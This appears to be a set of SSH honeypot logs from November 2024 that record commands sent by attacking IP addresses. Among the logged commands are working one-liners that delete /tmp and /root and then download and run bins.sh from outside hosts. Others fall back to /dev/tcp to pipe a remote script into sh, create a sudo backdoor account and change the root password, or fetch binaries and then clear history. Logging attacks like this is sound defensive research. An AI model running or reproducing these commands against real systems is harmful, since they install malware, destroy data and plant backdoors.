--- Start of remote_exec_dallas_07-10_12_24.log ---
start
2024-11-24 09:29:02.297640 - ('37.44.238.68', 36504) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-24 09:29:04.428387 - ('37.44.238.68', 34492) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-24 09:29:06.009648 - ('37.44.238.68', 34508) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-24 10:00:02.578786 - ('92.255.57.132', 60056) - echo 'SSH check'
2024-11-24 10:56:57.722670 - ('92.255.57.132', 59478) - echo 'SSH check'
2024-11-24 11:25:07.033513 - ('87.120.113.231', 49044) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-24 11:53:38.372446 - ('92.255.57.132', 42144) - echo 'SSH check'
2024-11-24 12:51:08.729404 - ('92.255.57.132', 52744) - echo 'SSH check'
2024-11-24 13:48:16.135319 - ('92.255.57.132', 46372) - echo 'SSH check'
2024-11-24 13:51:19.561802 - ('218.92.0.132', 57124) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-24 13:51:20.636467 - ('218.92.0.132', 57124) - ls -la /var/run/gcc.pid
2024-11-24 14:45:32.333089 - ('92.255.57.132', 60432) - echo 'SSH check'
2024-11-24 15:42:48.330563 - ('92.255.57.132', 52626) - echo 'SSH check'
2024-11-24 16:40:00.367722 - ('92.255.57.132', 60328) - echo 'SSH check'
2024-11-24 17:37:06.793530 - ('46.19.143.66', 34960) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 P4MnUY6C) system && sudo usermod -aG sudo system
2024-11-24 17:37:07.420151 - ('46.19.143.66', 34960) - lscpu && echo -e "P4MnUY6C\nP4MnUY6C" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-24 17:37:16.998795 - ('92.255.57.132', 47866) - echo 'SSH check'
2024-11-24 17:56:09.938436 - ('86.59.236.63', 53332) - scp -t /tmp/URzSfP4Q
2024-11-24 17:56:10.591502 - ('86.59.236.63', 53348) - scp -t /tmp/URzSfP4Q
2024-11-24 18:34:20.956326 - ('92.255.57.132', 40720) - echo 'SSH check'
2024-11-24 19:10:20.484837 - ('87.120.113.231', 47118) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-24 19:31:22.499617 - ('92.255.57.132', 38320) - echo 'SSH check'
2024-11-24 19:56:48.325796 - ('87.120.113.231', 34160) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-24 20:28:32.004421 - ('92.255.57.132', 59172) - echo 'SSH check'
2024-11-24 21:25:24.260915 - ('92.255.57.132', 37612) - echo 'SSH check'
2024-11-24 22:13:06.038338 - ('46.19.143.66', 40902) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 36aV5J5y) system && sudo usermod -aG sudo system
2024-11-24 22:13:06.538068 - ('46.19.143.66', 40902) - lscpu && echo -e "36aV5J5y\n36aV5J5y" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-24 22:22:27.264097 - ('92.255.57.132', 35328) - echo 'SSH check'
2024-11-24 23:19:19.796670 - ('92.255.57.132', 56220) - echo 'SSH check'
2024-11-25 00:16:31.398276 - ('92.255.57.132', 37508) - echo 'SSH check'
2024-11-25 01:02:46.310164 - ('119.195.45.207', 36334) - /ip cloud print
2024-11-25 01:02:54.090509 - ('119.195.45.207', 36334) - ifconfig
2024-11-25 01:03:01.161608 - ('119.195.45.207', 36334) - uname -a
2024-11-25 01:03:07.220772 - ('119.195.45.207', 36334) - cat /proc/cpuinfo
2024-11-25 01:03:13.410403 - ('119.195.45.207', 36334) - ps | grep '[Mm]iner'
2024-11-25 01:03:19.620837 - ('119.195.45.207', 36334) - ps -ef | grep '[Mm]iner'
2024-11-25 01:03:25.403441 - ('119.195.45.207', 36334) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-25 01:03:32.188579 - ('119.195.45.207', 36334) - echo Hi | cat -n
2024-11-25 01:13:15.945075 - ('92.255.57.132', 58508) - echo 'SSH check'
2024-11-25 02:10:43.817349 - ('92.255.57.132', 36610) - echo 'SSH check'
2024-11-25 03:08:01.109016 - ('92.255.57.132', 45400) - echo 'SSH check'
2024-11-25 03:31:43.940587 - ('192.141.148.103', 44562) - scp -t /tmp/TsAvDtUS
2024-11-25 03:31:45.147291 - ('192.141.148.103', 44566) - scp -t /tmp/TsAvDtUS
2024-11-25 04:04:46.675554 - ('92.255.57.132', 44608) - echo 'SSH check'
2024-11-25 05:02:13.592852 - ('92.255.57.132', 54912) - echo 'SSH check'
2024-11-25 05:14:49.695433 - ('2.37.184.11', 34932) - scp -t /tmp/2KYra1hM
2024-11-25 05:14:50.504348 - ('2.37.184.11', 34954) - scp -t /tmp/2KYra1hM
2024-11-25 05:59:13.479925 - ('92.255.57.132', 50600) - echo 'SSH check'
2024-11-25 06:30:42.160585 - ('218.92.0.132', 41452) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-25 06:30:44.351616 - ('218.92.0.132', 41452) - ls -la /var/run/gcc.pid
2024-11-25 06:56:37.493228 - ('92.255.57.132', 44194) - echo 'SSH check'
2024-11-25 07:06:16.666038 - ('46.19.143.66', 33670) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 6jmSNjwe) system && sudo usermod -aG sudo system
2024-11-25 07:06:17.134475 - ('46.19.143.66', 33670) - lscpu && echo -e "6jmSNjwe\n6jmSNjwe" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-25 07:53:30.255707 - ('92.255.57.132', 49490) - echo 'SSH check'
2024-11-25 08:50:56.231238 - ('92.255.57.132', 60492) - echo 'SSH check'
2024-11-25 09:39:28.242957 - ('87.120.113.231', 45094) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-25 09:48:01.608830 - ('92.255.57.132', 58352) - echo 'SSH check'
2024-11-25 10:45:15.409050 - ('92.255.57.132', 42496) - echo 'SSH check'
2024-11-25 11:08:33.476183 - ('218.52.119.127', 44878) - /ip cloud print
2024-11-25 11:08:34.625426 - ('218.52.119.127', 44878) - ifconfig
2024-11-25 11:08:35.564565 - ('218.52.119.127', 44878) - uname -a
2024-11-25 11:08:36.500834 - ('218.52.119.127', 44878) - cat /proc/cpuinfo
2024-11-25 11:08:37.437233 - ('218.52.119.127', 44878) - ps | grep '[Mm]iner'
2024-11-25 11:08:38.374044 - ('218.52.119.127', 44878) - ps -ef | grep '[Mm]iner'
2024-11-25 11:08:39.312829 - ('218.52.119.127', 44878) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-25 11:08:40.248609 - ('218.52.119.127', 44878) - echo Hi | cat -n
2024-11-25 11:30:03.192395 - ('87.120.113.231', 50542) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-25 11:42:17.604791 - ('92.255.57.132', 35034) - echo 'SSH check'
2024-11-25 12:39:37.271665 - ('92.255.57.132', 60272) - echo 'SSH check'
2024-11-25 13:19:32.791049 - ('46.19.143.66', 39160) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 SKYB8s4f) system && sudo usermod -aG sudo system
2024-11-25 13:19:33.482506 - ('46.19.143.66', 39160) - lscpu && echo -e "SKYB8s4f\nSKYB8s4f" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-25 13:36:45.644635 - ('92.255.57.132', 54950) - echo 'SSH check'
2024-11-25 14:34:18.841578 - ('92.255.57.132', 42730) - echo 'SSH check'
2024-11-25 14:41:53.871275 - ('37.44.238.68', 50398) - whoami
2024-11-25 14:41:55.989913 - ('37.44.238.68', 50438) - whoami
2024-11-25 14:41:57.688515 - ('37.44.238.68', 50404) - whoami
2024-11-25 14:41:59.758568 - ('37.44.238.68', 50448) - whoami
2024-11-25 14:42:01.666152 - ('37.44.238.68', 50446) - whoami
2024-11-25 14:42:03.675713 - ('37.44.238.68', 50418) - whoami
2024-11-25 14:42:05.451279 - ('37.44.238.68', 50450) - whoami
2024-11-25 14:42:08.532899 - ('37.44.238.68', 50426) - whoami
2024-11-25 14:42:10.874480 - ('37.44.238.68', 50458) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:12.953059 - ('37.44.238.68', 50468) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:14.705095 - ('37.44.238.68', 50484) - whoami
2024-11-25 14:42:16.610176 - ('37.44.238.68', 40336) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:18.331415 - ('37.44.238.68', 40348) - whoami
2024-11-25 14:42:21.833899 - ('37.44.238.68', 40364) - whoami
2024-11-25 14:42:22.970087 - ('37.44.238.68', 40378) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:24.733015 - ('37.44.238.68', 40388) - whoami
2024-11-25 14:42:26.866887 - ('37.44.238.68', 40392) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:28.729163 - ('37.44.238.68', 40398) - whoami
2024-11-25 14:42:30.843592 - ('37.44.238.68', 40404) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:32.589493 - ('37.44.238.68', 40412) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:34.434792 - ('37.44.238.68', 40420) - whoami
2024-11-25 14:42:36.053988 - ('37.44.238.68', 56730) - whoami
2024-11-25 14:42:37.887531 - ('37.44.238.68', 56738) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:39.772185 - ('37.44.238.68', 56744) - whoami
2024-11-25 14:42:41.875741 - ('37.44.238.68', 56752) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:43.918165 - ('37.44.238.68', 58268) - whoami
2024-11-25 14:42:46.807582 - ('37.44.238.68', 58270) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:48.810041 - ('37.44.238.68', 58282) - whoami
2024-11-25 14:42:50.962011 - ('37.44.238.68', 58294) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:52.782419 - ('37.44.238.68', 58298) - whoami
2024-11-25 14:42:54.783887 - ('37.44.238.68', 58306) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:42:56.901163 - ('37.44.238.68', 45840) - whoami
2024-11-25 14:42:58.605909 - ('37.44.238.68', 45844) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:00.608837 - ('37.44.238.68', 45856) - whoami
2024-11-25 14:43:01.874050 - ('37.44.238.68', 45862) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:03.639973 - ('37.44.238.68', 44326) - whoami
2024-11-25 14:43:05.465955 - ('37.44.238.68', 44324) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:07.650638 - ('37.44.238.68', 44338) - whoami
2024-11-25 14:43:09.733490 - ('37.44.238.68', 44346) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:12.013012 - ('37.44.238.68', 44352) - whoami
2024-11-25 14:43:14.683270 - ('37.44.238.68', 44360) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:16.150123 - ('37.44.238.68', 44376) - whoami
2024-11-25 14:43:17.596286 - ('37.44.238.68', 44482) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:19.734071 - ('37.44.238.68', 44494) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:22.531235 - ('37.44.238.68', 33414) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:23.987079 - ('37.44.238.68', 33418) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:27.185819 - ('37.44.238.68', 33432) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:29.797617 - ('37.44.238.68', 47698) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:31.909943 - ('37.44.238.68', 47712) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 14:43:33.361408 - ('37.44.238.68', 56432) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-25 15:31:39.759955 - ('92.255.57.132', 50916) - echo 'SSH check'
2024-11-25 15:37:01.973739 - ('87.120.113.231', 53728) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

--- End of remote_exec_dallas_23-25_11_24.log ---

--- Start of remote_exec_dallas_25-29_11_24.log ---
start
2024-11-25 17:26:44.945309 - ('92.255.57.132', 57508) - echo 'SSH check'
2024-11-25 18:23:24.667412 - ('92.255.57.132', 45782) - echo 'SSH check'
2024-11-25 19:20:53.770232 - ('92.255.57.132', 33736) - echo 'SSH check'
2024-11-25 20:17:45.570126 - ('92.255.57.132', 44706) - echo 'SSH check'
2024-11-25 21:08:45.541500 - ('46.19.143.66', 46672) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 RZkEb6Fw) system && sudo usermod -aG sudo system
2024-11-25 21:08:46.173614 - ('46.19.143.66', 46672) - lscpu && echo -e "RZkEb6Fw\nRZkEb6Fw" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-25 21:14:44.684469 - ('92.255.57.132', 59206) - echo 'SSH check'
2024-11-25 21:37:37.007837 - ('222.102.21.102', 40666) - /ip cloud print
2024-11-25 21:37:38.124332 - ('222.102.21.102', 40666) - ifconfig
2024-11-25 21:37:39.056873 - ('222.102.21.102', 40666) - uname -a
2024-11-25 21:37:39.985138 - ('222.102.21.102', 40666) - cat /proc/cpuinfo
2024-11-25 21:37:40.922897 - ('222.102.21.102', 40666) - ps | grep '[Mm]iner'
2024-11-25 21:37:41.845990 - ('222.102.21.102', 40666) - ps -ef | grep '[Mm]iner'
2024-11-25 21:37:42.774889 - ('222.102.21.102', 40666) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-25 21:37:43.712990 - ('222.102.21.102', 40666) - echo Hi | cat -n
2024-11-25 22:12:04.424430 - ('92.255.57.132', 32992) - echo 'SSH check'
2024-11-25 23:08:55.738048 - ('92.255.57.132', 38438) - echo 'SSH check'
2024-11-26 00:05:58.098583 - ('92.255.57.132', 59552) - echo 'SSH check'
2024-11-26 01:03:38.898224 - ('92.255.57.132', 51098) - echo 'SSH check'
2024-11-26 01:40:03.444736 - ('87.120.113.231', 46966) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 02:00:29.064966 - ('92.255.57.132', 48070) - echo 'SSH check'
2024-11-26 02:57:18.512855 - ('92.255.57.132', 51408) - echo 'SSH check'
2024-11-26 02:58:49.578202 - ('87.120.113.231', 57438) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 03:30:16.051456 - ('87.120.113.231', 58662) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-26 03:53:37.689254 - ('92.255.57.132', 38092) - echo 'SSH check'
2024-11-26 04:47:10.887398 - ('92.255.57.132', 47684) - echo 'SSH check'
2024-11-26 04:50:03.798987 - ('46.19.143.66', 48992) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 BKJkh8GS) system && sudo usermod -aG sudo system
2024-11-26 04:50:04.570330 - ('46.19.143.66', 48992) - lscpu && echo -e "BKJkh8GS\nBKJkh8GS" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-26 05:43:09.790355 - ('92.255.57.132', 38518) - echo 'SSH check'
2024-11-26 06:06:55.856494 - ('46.19.143.66', 46606) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 4Nz2Gs2z) system && sudo usermod -aG sudo system
2024-11-26 06:06:56.446211 - ('46.19.143.66', 46606) - lscpu && echo -e "4Nz2Gs2z\n4Nz2Gs2z" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-26 06:40:11.393882 - ('92.255.57.132', 46536) - echo 'SSH check'
